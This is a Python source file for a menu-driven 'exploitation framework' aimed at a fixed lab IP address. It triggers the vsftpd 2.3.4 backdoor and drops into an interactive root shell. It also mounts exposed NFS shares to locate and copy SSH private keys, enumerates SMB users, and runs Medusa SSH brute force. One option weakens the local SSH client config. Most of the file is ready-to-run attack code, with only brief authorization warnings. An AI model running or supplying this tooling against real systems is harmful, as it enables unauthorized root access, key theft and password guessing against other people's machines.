#!/usr/bin/env python3
"""
Complete FTP, NFS, SMB & SSH Exploitation Script
- FTP Anonymous Login
- FTP Version Detection
- vsftpd 2.3.4 Backdoor Exploit
- NFS/RPC Enumeration
- NFS Mount & File Access
- SMB Enumeration (enum4linux -U)
- SSH Brute Force via Medusa (Port 22)
WARNING: Use ONLY on authorized systems or training environments
"""

from ftplib import FTP
import subprocess
import socket
import sys
import time
import os
from datetime import datetime
import shutil
import re
from pathlib import Path

# Configuration
TARGET_IP = "192.168.44.137"
FTP_PORT = 21
USERNAME = "anonymous"
PASSWORD = "anonymous"
NFS_MOUNT_POINT = "/mnt/nfs_target"

# Default username/password files for SSH brute
DEFAULT_USERNAMES = "/home/kali/usernames.txt"
DEFAULT_PASSWORDS = "/home/kali/smallpass.txt"

class FTPExploit:
    def __init__(self, host, port=21, username="anonymous", password="anonymous"):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.ftp = None

    # ... (same FTPExploit methods as previous version) ...
    def connect(self):
        """Connect to FTP server"""
        try:
            print(f"[*] Connecting to FTP server at {self.host}:{self.port}")
            self.ftp = FTP()
            self.ftp.connect(self.host, self.port, timeout=10)
            print(f"[*] Connected! Server Banner:")
            print(f"    {self.ftp.getwelcome()}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False

    def login(self):
        try:
            print(f"\n[*] Attempting login...")
            print(f"    Username: {self.username}")
            print(f"    Password: {self.password}")
            response = self.ftp.login(self.username, self.password)
            print(f"[+] Login successful!")
            print(f"    Server Response: {response}")
            return True
        except Exception as e:
            print(f"[-] Login failed: {e}")
            return False

    def get_current_directory(self):
        try:
            cwd = self.ftp.pwd()
            print(f"\n[*] Current Directory: {cwd}")
            return cwd
        except Exception as e:
            print(f"[-] Error getting directory: {e}")
            return None

    def list_files(self, path="."):
        try:
            print(f"\n[*] Listing contents of: {path}")
            print("-" * 60)
            files = []
            self.ftp.retrlines('LIST', files.append)
            if files:
                for item in files:
                    print(f"    {item}")
                print(f"\n[+] Total items: {len(files)}")
            else:
                print("    [Empty directory]")
            return files
        except Exception as e:
            print(f"[-] Error listing files: {e}")
            return []

    def download_file(self, remote_file, local_file=None):
        try:
            if local_file is None:
                local_file = remote_file
            print(f"\n[*] Downloading: {remote_file}")
            print(f"    Saving as: {local_file}")
            with open(local_file, 'wb') as f:
                self.ftp.retrbinary(f'RETR {remote_file}', f.write)
            print(f"[+] Download completed!")
            return True
        except Exception as e:
            print(f"[-] Download failed: {e}")
            return False

    def change_directory(self, path):
        try:
            self.ftp.cwd(path)
            print(f"[+] Changed directory to: {path}")
            return True
        except Exception as e:
            print(f"[-] Failed to change directory: {e}")
            return False

    def get_system_info(self):
        try:
            print(f"\n[*] Server Information:")
            print("-" * 60)
            try:
                syst = self.ftp.sendcmd('SYST')
                print(f"    System Type: {syst}")
            except:
                pass
            try:
                stat = self.ftp.sendcmd('STAT')
                print(f"    Status: {stat}")
            except:
                pass
        except Exception as e:
            print(f"[-] Error getting system info: {e}")

    def interactive_mode(self):
        print("\n" + "=" * 60)
        print("INTERACTIVE FTP MODE")
        print("=" * 60)
        print("Commands: ls, cd <dir>, get <file>, pwd, help, exit")
        print("=" * 60)
        self.get_current_directory()
        while True:
            try:
                cmd = input("\nftp> ").strip()
                if not cmd:
                    continue
                if cmd in ("exit", "quit"):
                    print("[*] Exiting...")
                    break
                if cmd in ("ls", "dir"):
                    self.list_files()
                elif cmd == "pwd":
                    self.get_current_directory()
                elif cmd.startswith("cd "):
                    path = cmd[3:].strip()
                    if self.change_directory(path):
                        self.get_current_directory()
                elif cmd.startswith("get "):
                    filename = cmd[4:].strip()
                    self.download_file(filename)
                elif cmd == "help":
                    print("\nAvailable commands:")
                    print("  ls, dir     - List files")
                    print("  pwd         - Print working directory")
                    print("  cd <dir>    - Change directory")
                    print("  get <file>  - Download file")
                    print("  help        - Show this help")
                    print("  exit, quit  - Exit FTP session")
                else:
                    print(f"[-] Unknown command: {cmd}")
                    print("    Type 'help' for available commands")
            except KeyboardInterrupt:
                print("\n[*] Interrupted by user")
                break
            except Exception as e:
                print(f"[-] Error: {e}")

    def close(self):
        try:
            if self.ftp:
                self.ftp.quit()
                print("\n[*] Connection closed")
        except:
            pass

class FTPVersionScanner:
    @staticmethod
    def scan_version(target_ip):
        print("\n" + "=" * 60)
        print("FTP VERSION DETECTION (NMAP)")
        print("=" * 60)
        if not shutil.which("nmap"):
            print("[-] nmap not found. Install with: sudo apt install nmap")
            return None
        try:
            cmd = f"nmap -sV -p21 {target_ip}"
            print(f"[*] Running: {cmd}")
            print("-" * 60)
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            output = result.stdout
            print(output)
            if "vsftpd 2.3.4" in output.lower():
                print("\n[!] VULNERABLE VERSION DETECTED: vsftpd 2.3.4")
                print("[!] This version has a known backdoor vulnerability!")
                return "vsftpd 2.3.4"
            else:
                print("\n[*] Version scan completed")
                return None
        except subprocess.TimeoutExpired:
            print("[-] Nmap scan timeout")
            return None
        except Exception as e:
            print(f"[-] Error running nmap: {e}")
            print("[!] Make sure nmap is installed: sudo apt install nmap")
            return None

class VsftpdBackdoorExploit:
    def __init__(self, target_ip, target_port=21):
        self.target_ip = target_ip
        self.target_port = target_port
        self.backdoor_port = 6200

    def trigger_backdoor(self):
        print("\n" + "=" * 60)
        print("VSFTPD 2.3.4 BACKDOOR EXPLOIT")
        print("=" * 60)
        print(f"[*] Target: {self.target_ip}:{self.target_port}")
        print("[*] Attempting to trigger backdoor...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target_ip, self.target_port))
            banner = sock.recv(1024)
            try:
                print(f"[*] Banner: {banner.decode().strip()}")
            except:
                print(f"[*] Banner: {banner!r}")
            print("[*] Sending malicious username...")
            sock.send(b"USER hacker:)\n")
            time.sleep(1)
            response = sock.recv(1024)
            try:
                print(f"[*] Response: {response.decode().strip()}")
            except:
                print(f"[*] Response: {response!r}")
            sock.send(b"PASS password\n")
            time.sleep(2)
            sock.close()
            print(f"[*] Backdoor triggered! Checking port {self.backdoor_port}...")
            return self.connect_backdoor()
        except Exception as e:
            print(f"[-] Failed to trigger backdoor: {e}")
            return False

    def connect_backdoor(self):
        try:
            print(f"[*] Attempting to connect to backdoor on port {self.backdoor_port}...")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, self.backdoor_port))
            print("[+] BACKDOOR CONNECTION SUCCESSFUL!")
            print("[+] You have a root shell!")
            print("-" * 60)
            sock.send(b"id\n")
            time.sleep(1)
            try:
                response = sock.recv(4096).decode()
                print(f"[*] Shell test (id command):\n{response}")
            except:
                pass
            self.interactive_shell(sock)
            return True
        except socket.timeout:
            print("[-] Connection timeout - backdoor may not be open")
            return False
        except Exception as e:
            print(f"[-] Failed to connect to backdoor: {e}")
            return False

    def interactive_shell(self, sock):
        print("\n[*] Entering interactive shell mode")
        print("[*] Type commands or 'exit' to quit")
        print("=" * 60)
        sock.setblocking(0)
        while True:
            try:
                cmd = input("root@metasploitable# ")
                if cmd.strip() == "exit":
                    print("[*] Exiting shell...")
                    break
                sock.send((cmd + "\n").encode())
                time.sleep(0.5)
                try:
                    response = sock.recv(4096).decode()
                    if response:
                        print(response, end='')
                except:
                    pass
            except KeyboardInterrupt:
                print("\n[*] Interrupted by user")
                break
            except Exception as e:
                print(f"[-] Error: {e}")
                break
        sock.close()

    def exploit_with_metasploit(self):
        print("\n" + "=" * 60)
        print("METASPLOIT EXPLOITATION")
        print("=" * 60)
        print("[*] To exploit using Metasploit, run these commands:")
        print("-" * 60)
        print("msfconsole")
        print(f"use exploit/unix/ftp/vsftpd_234_backdoor")
        print(f"set RHOSTS {self.target_ip}")
        print(f"set RPORT {self.target_port}")
        print("exploit")
        print("-" * 60)
        print("\n[*] Would you like to launch msfconsole now? (y/n)")
        choice = input(">>> ").strip().lower()
        if choice == 'y':
            if not shutil.which("msfconsole"):
                print("[-] msfconsole not found in PATH.")
                return
            try:
                print("[*] Launching Metasploit...")
                subprocess.run("msfconsole", shell=True)
            except Exception as e:
                print(f"[-] Failed to launch msfconsole: {e}")

class NFSEnumerator:
    def __init__(self, target_ip, mount_point=NFS_MOUNT_POINT):
        self.target_ip = target_ip
        self.mount_point = mount_point

    def rpcinfo_scan(self):
        print("\n" + "=" * 60)
        print("RPC SERVICE ENUMERATION")
        print("=" * 60)
        if not shutil.which("rpcinfo"):
            print("[-] rpcinfo not found. Install with: sudo apt install rpcbind rpcbind-utils (or rpcbind)")
            return None
        try:
            cmd = f"rpcinfo -p {self.target_ip}"
            print(f"[*] Running: {cmd}")
            print("-" * 60)
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout
            if output:
                print(output)
                if "nfs" in output.lower():
                    print("\n[+] NFS service detected!")
                if "mountd" in output.lower():
                    print("[+] Mount daemon detected!")
                return output
            else:
                print("[-] No RPC services found or host not responding")
                return None
        except subprocess.TimeoutExpired:
            print("[-] RPC scan timeout")
            return None
        except Exception as e:
            print(f"[-] Error running rpcinfo: {e}")
            print("[!] Make sure rpcinfo is installed")
            return None

    def nmap_nfs_scan(self):
        print("\n" + "=" * 60)
        print("NMAP NFS SCRIPTS SCAN")
        print("=" * 60)
        if not shutil.which("nmap"):
            print("[-] nmap not found. Install with: sudo apt install nmap")
            return None
        try:
            cmd = f"nmap -sV --script=nfs-showmount,nfs-ls,nfs-statfs {self.target_ip}"
            print(f"[*] Running: {cmd}")
            print("-" * 60)
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            output = result.stdout
            print(output)
            return output
        except subprocess.TimeoutExpired:
            print("[-] Nmap NFS scan timeout")
            return None
        except Exception as e:
            print(f"[-] Error running nmap: {e}")
            return None

    def showmount_enum(self):
        print("\n" + "=" * 60)
        print("NFS EXPORT LISTING")
        print("=" * 60)
        if not shutil.which("showmount"):
            print("[-] showmount not found. Install with: sudo apt install nfs-common")
            return []
        try:
            cmd = f"showmount -e {self.target_ip}"
            print(f"[*] Running: {cmd}")
            print("-" * 60)
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout
            if output:
                print(output)
                exports = []
                for line in output.split('\n')[1:]:
                    if line.strip():
                        parts = line.split()
                        if parts:
                            exports.append(parts[0])
                if exports:
                    print(f"\n[+] Found {len(exports)} NFS export(s):")
                    for exp in exports:
                        print(f"    - {exp}")
                    return exports
                else:
                    print("\n[-] No exports found")
                    return []
            else:
                print("[-] No exports found or showmount failed")
                return []
        except subprocess.TimeoutExpired:
            print("[-] Showmount timeout")
            return []
        except Exception as e:
            print(f"[-] Error running showmount: {e}")
            print("[!] Make sure nfs-common is installed: sudo apt install nfs-common")
            return []

    def mount_nfs(self, export_path="/home"):
        print("\n" + "=" * 60)
        print("NFS MOUNT OPERATION")
        print("=" * 60)
        try:
            if not os.path.exists(self.mount_point):
                print(f"[*] Creating mount point: {self.mount_point}")
                os.makedirs(self.mount_point, exist_ok=True)
            cmd = f"mount -t nfs {self.target_ip}:{export_path} {self.mount_point}"
            print(f"[*] Running: sudo {cmd}")
            result = subprocess.run(f"sudo {cmd}", shell=True, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                print(f"[+] NFS share mounted successfully at: {self.mount_point}")
                return True
            else:
                print(f"[-] Mount failed: {result.stderr}")
                return False
        except Exception as e:
            print(f"[-] Error mounting NFS: {e}")
            return False

    def list_mounted_files(self):
        print("\n" + "=" * 60)
        print(f"LISTING FILES IN: {self.mount_point}")
        print("=" * 60)
        try:
            cmd = f"ls -laR {self.mount_point}"
            print(f"[*] Running: {cmd}")
            print("-" * 60)
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout
            print(output)
            return output
        except Exception as e:
            print(f"[-] Error listing files: {e}")
            return None

    def find_ssh_keys(self):
        print("\n" + "=" * 60)
        print("SEARCHING FOR SSH KEYS")
        print("=" * 60)
        try:
            cmd = f"find {self.mount_point} -name 'id_rsa*' -o -name 'authorized_keys' 2>/dev/null"
            print(f"[*] Running: {cmd}")
            print("-" * 60)
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout
            if output:
                print("[+] SSH keys found:")
                print(output)
                keys = [k for k in output.strip().split('\n') if k]
                return keys
            else:
                print("[-] No SSH keys found")
                return []
        except Exception as e:
            print(f"[-] Error searching for keys: {e}")
            return []

    def copy_ssh_key(self, key_path):
        print(f"\n[*] Copying SSH key from: {key_path}")
        try:
            parts = [p for p in key_path.split('/') if p]
            username = parts[-3] if len(parts) > 2 else "user"
            local_key = f"{username}_id_rsa"
            cmd = f"cp {key_path} ~/{local_key}"
            print(f"[*] Running: {cmd}")
            result = subprocess.run(cmd, shell=True, timeout=10)
            if result.returncode == 0:
                subprocess.run(f"chmod 600 ~/{local_key}", shell=True)
                print(f"[+] SSH key copied to: ~/{local_key}")
                print(f"[*] Use it with: ssh -i ~/{local_key} {username}@{self.target_ip}")
                return True
            else:
                print("[-] Failed to copy key")
                return False
        except Exception as e:
            print(f"[-] Error copying key: {e}")
            return False

    def unmount_nfs(self):
        print(f"\n[*] Unmounting: {self.mount_point}")
        try:
            cmd = f"sudo umount {self.mount_point}"
            result = subprocess.run(cmd, shell=True, timeout=10)
            if result.returncode == 0:
                print("[+] NFS unmounted successfully")
                return True
            else:
                print("[-] Unmount failed")
                return False
        except Exception as e:
            print(f"[-] Error unmounting: {e}")
            return False

class SMBEnumerator:
    def __init__(self, target_ip):
        self.target_ip = target_ip

    def enum4linux_users(self):
        print("\n" + "=" * 60)
        print("SMB ENUMERATION (enum4linux -U)")
        print("=" * 60)
        if not shutil.which("enum4linux"):
            print("[-] enum4linux not found. Install it (it's often in package 'enum4linux' or available from: https://github.com/asi/enum4linux)")
            return None
        try:
            cmd = f"enum4linux -U {self.target_ip}"
            print(f"[*] Running: {cmd}")
            print("-" * 60)
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=90)
            output = result.stdout
            stderr = result.stderr
            if output:
                print(output)
            if stderr:
                print(stderr)
            users = []
            rids = []
            domain = None
            for line in output.splitlines():
                l = line.strip()
                if l.lower().startswith("user:") or "user:" in l.lower():
                    try:
                        m = re.search(r"User:\s*([^\s(]+)", l, re.I)
                        if m:
                            users.append(m.group(1))
                    except:
                        pass
                if "rid:" in l.lower() or "rid =" in l.lower():
                    try:
                        m = re.search(r"RID[:=]\s*([0-9]+)", l, re.I)
                        if m:
                            rids.append(m.group(1))
                    except:
                        pass
                if l.lower().startswith("workgroup") or l.lower().startswith("domain"):
                    try:
                        m = re.search(r"(?:Workgroup|Domain)[:\s]*([A-Za-z0-9_-]+)", l, re.I)
                        if m:
                            domain = m.group(1)
                    except:
                        pass
            print("\n[+] Parsed SMB Info:")
            if domain:
                print(f"    Workgroup/Domain: {domain}")
            if users:
                u_unique = sorted(set(users))
                print(f"    Users ({len(u_unique)}): {', '.join(u_unique)}")
            else:
                print("    No users parsed.")
            if rids:
                print(f"    RIDs found: {', '.join(sorted(set(rids)))}")
            return {"raw": output, "users": sorted(set(users)), "rids": sorted(set(rids)), "domain": domain}
        except subprocess.TimeoutExpired:
            print("[-] enum4linux timed out")
            return None
        except Exception as e:
            print(f"[-] Error running enum4linux: {e}")
            return None

class SSHBruteForcer:
    """SSH brute force support using Medusa, plus ssh_config edits and username/password list helpers"""
    SSH_CONFIG_PATH = "/etc/ssh/ssh_config"
    SSH_CONFIG_BACKUP = "/etc/ssh/ssh_config.bak.exploit_framework"

    def __init__(self, target_ip, usernames=DEFAULT_USERNAMES, passwords=DEFAULT_PASSWORDS):
        self.target_ip = target_ip
        self.usernames = usernames
        self.passwords = passwords

    def show_ssh_config_recommendation(self):
        print("\n" + "=" * 60)
        print("SSH CLIENT CONFIG RECOMMENDATION (to allow old algorithms)")
        print("=" * 60)
        print("Add the following lines to /etc/ssh/ssh_config (or your SSH client config):\n")
        print("HostKeyAlgorithms +ssh-rsa,ssh-dss")
        print("PubkeyAcceptedKeyTypes +ssh-rsa")
        print("KexAlgorithms +diffie-hellman-group1-sha1,diffie-hellman-group14-sha1")
        print("\nDescription: These add weaker/legacy algorithms so you can connect to very old servers.")
        print("WARNING: This weakens your client security. Revert after testing.\n")

    def edit_ssh_config_apply(self):
        """Safely append the recommended lines to /etc/ssh/ssh_config with a backup"""
        print("\n" + "=" * 60)
        print("APPLY SSH CONFIG CHANGES")
        print("=" * 60)
        if not os.path.exists(self.SSH_CONFIG_PATH):
            print(f"[-] SSH config not found at {self.SSH_CONFIG_PATH}")
            return False
        try:
            # Create backup
            if not os.path.exists(self.SSH_CONFIG_BACKUP):
                print(f"[*] Creating backup: {self.SSH_CONFIG_BACKUP}")
                try:
                    shutil.copy(self.SSH_CONFIG_PATH, self.SSH_CONFIG_BACKUP)
                except PermissionError:
                    print("[-] Permission denied: need sudo to backup/edit ssh_config")
                    return False
            else:
                print(f"[*] Backup already exists: {self.SSH_CONFIG_BACKUP}")
            additions = (
                "\n# Added by exploit_framework - allow legacy algorithms (testing only)\n"
                "HostKeyAlgorithms +ssh-rsa,ssh-dss\n"
                "PubkeyAcceptedKeyTypes +ssh-rsa\n"
                "KexAlgorithms +diffie-hellman-group1-sha1,diffie-hellman-group14-sha1\n"
            )
            try:
                with open(self.SSH_CONFIG_PATH, "a") as f:
                    f.write(additions)
                print(f"[+] Appended recommended lines to {self.SSH_CONFIG_PATH}")
                print("[*] Remember to restore from backup after testing:")
                print(f"    sudo cp {self.SSH_CONFIG_BACKUP} {self.SSH_CONFIG_PATH}")
                return True
            except PermissionError:
                print("[-] Permission denied: need sudo to edit ssh_config (run script with sudo)")
                return False
        except Exception as e:
            print(f"[-] Error editing ssh_config: {e}")
            return False

    def show_usernames(self, path=None):
        """Display username list file contents"""
        p = path or self.usernames
        print("\n" + "=" * 60)
        print(f"USERNAME LIST: {p}")
        print("=" * 60)
        try:
            with open(p, 'r') as f:
                data = f.read().strip()
            print(data if data else "[Empty file]")
            return data
        except FileNotFoundError:
            print("[-] Username file not found.")
            return None
        except Exception as e:
            print(f"[-] Error reading usernames: {e}")
            return None

    def show_passwords(self, path=None):
        """Display password list file contents"""
        p = path or self.passwords
        print("\n" + "=" * 60)
        print(f"PASSWORD LIST: {p}")
        print("=" * 60)
        try:
            with open(p, 'r') as f:
                data = f.read().strip()
            print(data if data else "[Empty file]")
            return data
        except FileNotFoundError:
            print("[-] Password file not found.")
            return None
        except Exception as e:
            print(f"[-] Error reading passwords: {e}")
            return None

    def run_medusa(self, usernames_path=None, passwords_path=None, threads=4):
        """Run medusa against the target using provided lists"""
        print("\n" + "=" * 60)
        print("SSH BRUTE FORCE (Medusa)")
        print("=" * 60)
        if not shutil.which("medusa"):
            print("[-] medusa not found. Install with: sudo apt install medusa")
            return None
        u_path = usernames_path or self.usernames
        p_path = passwords_path or self.passwords
        # Validate files exist
        if not os.path.exists(u_path):
            print(f"[-] Username file not found: {u_path}")
            return None
        if not os.path.exists(p_path):
            print(f"[-] Password file not found: {p_path}")
            return None
        cmd = f"medusa -h {self.target_ip} -U {u_path} -P {p_path} -M ssh -t {threads}"
        print(f"[*] Running: {cmd}")
        print("-" * 60)
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
            print(result.stdout)
            if result.stderr:
                print(result.stderr)
            return result.stdout
        except subprocess.TimeoutExpired:
            print("[-] medusa timed out")
            return None
        except Exception as e:
            print(f"[-] Error running medusa: {e}")
            return None

def main_menu():
    print("\n" + "=" * 60)
    print("EXPLOITATION FRAMEWORK MENU")
    print("=" * 60)
    print("=== FTP ATTACKS ===")
    print("1. Anonymous FTP Login")
    print("2. FTP Version Detection (Nmap)")
    print("3. Exploit vsftpd 2.3.4 Backdoor")
    print("4. Metasploit Instructions (FTP)")
    print()
    print("=== NFS/RPC ATTACKS ===")
    print("5. RPC Service Enumeration (rpcinfo)")
    print("6. NFS Nmap Scripts Scan")
    print("7. NFS Export Listing (showmount)")
    print("8. Mount NFS Share")
    print("9. List Mounted Files")
    print("10. Find & Copy SSH Keys")
    print("11. Unmount NFS Share")
    print()
    print("=== AUTOMATED ===")
    print("12. Full FTP Attack")
    print("13. Full NFS Attack")
    print("14. Complete Automated Attack (FTP + NFS)")
    print()
    print("=== SMB ===")
    print("15. SMB Enumeration (enum4linux -U)")
    print()
    print("=== SSH ===")
    print("16. View recommended ssh_config lines (show only)")
    print("17. Apply recommended ssh_config changes (will backup and append; requires sudo)")
    print("18. Show username list file (for brute force)")
    print("19. Show password list file (for brute force)")
    print("20. Run SSH brute force (Medusa) using username/password lists")
    print()
    print("0. Exit")
    print("=" * 60)
    choice = input("Select option: ").strip()
    return choice

def main():
    print("=" * 60)
    print("COMPLETE EXPLOITATION FRAMEWORK (FTP, NFS, SMB, SSH)")
    print("=" * 60)
    print(f"Target: {TARGET_IP}")
    print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("WARNING: Use only on authorized systems!")
    print("=" * 60)
    while True:
        choice = main_menu()

        # FTP Attacks
        if choice == "1":
            ftp_exploit = FTPExploit(TARGET_IP, FTP_PORT, USERNAME, PASSWORD)
            try:
                if ftp_exploit.connect() and ftp_exploit.login():
                    ftp_exploit.get_current_directory()
                    ftp_exploit.list_files()
                    ftp_exploit.get_system_info()
                    ftp_exploit.interactive_mode()
            finally:
                ftp_exploit.close()

        elif choice == "2":
            FTPVersionScanner.scan_version(TARGET_IP)

        elif choice == "3":
            exploit = VsftpdBackdoorExploit(TARGET_IP, FTP_PORT)
            exploit.trigger_backdoor()

        elif choice == "4":
            exploit = VsftpdBackdoorExploit(TARGET_IP, FTP_PORT)
            exploit.exploit_with_metasploit()

        # NFS/RPC Attacks
        elif choice == "5":
            nfs = NFSEnumerator(TARGET_IP)
            nfs.rpcinfo_scan()

        elif choice == "6":
            nfs = NFSEnumerator(TARGET_IP)
            nfs.nmap_nfs_scan()

        elif choice == "7":
            nfs = NFSEnumerator(TARGET_IP)
            exports = nfs.showmount_enum()

        elif choice == "8":
            nfs = NFSEnumerator(TARGET_IP)
            export = input("Enter export path (default: /home): ").strip() or "/home"
            nfs.mount_nfs(export)

        elif choice == "9":
            nfs = NFSEnumerator(TARGET_IP)
            nfs.list_mounted_files()

        elif choice == "10":
            nfs = NFSEnumerator(TARGET_IP)
            keys = nfs.find_ssh_keys()
            if keys:
                for idx, key in enumerate(keys, 1):
                    print(f"{idx}. {key}")
                choice_k = input("\nSelect key to copy (number): ").strip()
                try:
                    key_idx = int(choice_k) - 1
                    if 0 <= key_idx < len(keys):
                        nfs.copy_ssh_key(keys[key_idx])
                except:
                    print("[-] Invalid selection")

        elif choice == "11":
            nfs = NFSEnumerator(TARGET_IP)
            nfs.unmount_nfs()

        # Automated Attacks
        elif choice == "12":
            print("\n[*] Starting full FTP attack...")
            version = FTPVersionScanner.scan_version(TARGET_IP)
            ftp_exploit = FTPExploit(TARGET_IP, FTP_PORT, USERNAME, PASSWORD)
            if ftp_exploit.connect() and ftp_exploit.login():
                ftp_exploit.get_current_directory()
                ftp_exploit.list_files()
                ftp_exploit.close()
            if version and "2.3.4" in version:
                exploit = VsftpdBackdoorExploit(TARGET_IP, FTP_PORT)
                exploit.trigger_backdoor()

        elif choice == "13":
            print("\n[*] Starting full NFS attack...")
            nfs = NFSEnumerator(TARGET_IP)
            nfs.rpcinfo_scan()
            exports = nfs.showmount_enum()
            if exports:
                if nfs.mount_nfs(exports[0]):
                    nfs.list_mounted_files()
                    keys = nfs.find_ssh_keys()
                    if keys:
                        print(f"\n[+] Found {len(keys)} SSH key(s)!")
                        print("[*] Use option 10 to copy them")

        elif choice == "14":
            print("\n[*] Starting complete automated attack (FTP + NFS)...")
            print("\n" + "="*60)
            print("PHASE 1: FTP ATTACK")
            print("="*60)
            version = FTPVersionScanner.scan_version(TARGET_IP)
            ftp_exploit = FTPExploit(TARGET_IP, FTP_PORT, USERNAME, PASSWORD)
            if ftp_exploit.connect() and ftp_exploit.login():
                ftp_exploit.get_current_directory()
                ftp_exploit.list_files()
                ftp_exploit.close()
            if version and "2.3.4" in version:
                exploit = VsftpdBackdoorExploit(TARGET_IP, FTP_PORT)
                exploit.trigger_backdoor()
            print("\n" + "="*60)
            print("PHASE 2: NFS ATTACK")
            print("="*60)
            nfs = NFSEnumerator(TARGET_IP)
            nfs.rpcinfo_scan()
            exports = nfs.showmount_enum()
            if exports:
                if nfs.mount_nfs(exports[0]):
                    nfs.list_mounted_files()
                    keys = nfs.find_ssh_keys()
                    if keys:
                        print(f"\n[+] Complete! Found {len(keys)} SSH key(s)")
                        print("[*] Use option 10 to copy them")
            print("\n[+] Automated attack completed!")

        # SMB
        elif choice == "15":
            smb = SMBEnumerator(TARGET_IP)
            smb.enum4linux_users()

        # SSH features
        elif choice == "16":
            ssh = SSHBruteForcer(TARGET_IP)
            ssh.show_ssh_config_recommendation()

        elif choice == "17":
            ssh = SSHBruteForcer(TARGET_IP)
            print("You are about to append weak algorithms to /etc/ssh/ssh_config and create a backup.")
            confirm = input("Proceed? (y/N): ").strip().lower()
            if confirm == "y":
                ssh.edit_ssh_config_apply()
            else:
                print("[*] Aborted.")

        elif choice == "18":
            path = input(f"Username file path (default: {DEFAULT_USERNAMES}): ").strip() or DEFAULT_USERNAMES
            ssh = SSHBruteForcer(TARGET_IP)
            ssh.show_usernames(path)

        elif choice == "19":
            path = input(f"Password file path (default: {DEFAULT_PASSWORDS}): ").strip() or DEFAULT_PASSWORDS
            ssh = SSHBruteForcer(TARGET_IP)
            ssh.show_passwords(path)

        elif choice == "20":
            u_path = input(f"Username file path (default: {DEFAULT_USERNAMES}): ").strip() or DEFAULT_USERNAMES
            p_path = input(f"Password file path (default: {DEFAULT_PASSWORDS}): ").strip() or DEFAULT_PASSWORDS
            threads = input("Number of threads (default 4): ").strip() or "4"
            try:
                threads = int(threads)
            except:
                threads = 4
            ssh = SSHBruteForcer(TARGET_IP, usernames=u_path, passwords=p_path)
            print("** Make sure you have permission to test this host **")
            confirm = input("Proceed with medusa brute force? (y/N): ").strip().lower()
            if confirm == "y":
                ssh.run_medusa(usernames_path=u_path, passwords_path=p_path, threads=threads)
            else:
                print("[*] Aborted.")

        elif choice == "0":
            print("[*] Returning to Ra3Vector shell...")
            return

        else:
            print("[-] Invalid choice")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script may require root privileges for some operations (NFS mount/unmount, editing /etc/ssh/ssh_config).")
        print("[-] Consider running with: sudo python3 script.py")
    main()
